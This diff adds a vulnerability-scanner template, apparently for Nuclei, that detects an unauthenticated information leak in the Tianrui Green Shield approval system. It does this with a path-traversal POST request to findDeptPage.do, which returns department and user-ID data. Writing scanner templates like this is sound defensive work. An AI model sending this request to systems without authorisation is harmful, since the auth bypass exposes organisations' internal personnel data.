@@ -1,0 +1,47 @@
+id: poc-tipray-gsas-finddeptpage-do-info-leak
+info:
+  name: Tianrui Green Shield Approval System findDeptPage.do Info Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - raw:
+      - |
+        GET /trwfe/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "天锐绿盾审批系统"
+        part: body
+
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/dept/findDeptPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        parentId=1&deptName=&pageVo=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"total":'
+          - '"parentName":'
+          - '"parentId":'
+          - '"userIdArr":'
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<"
+        condition: and
+        part: body
+        negative: true
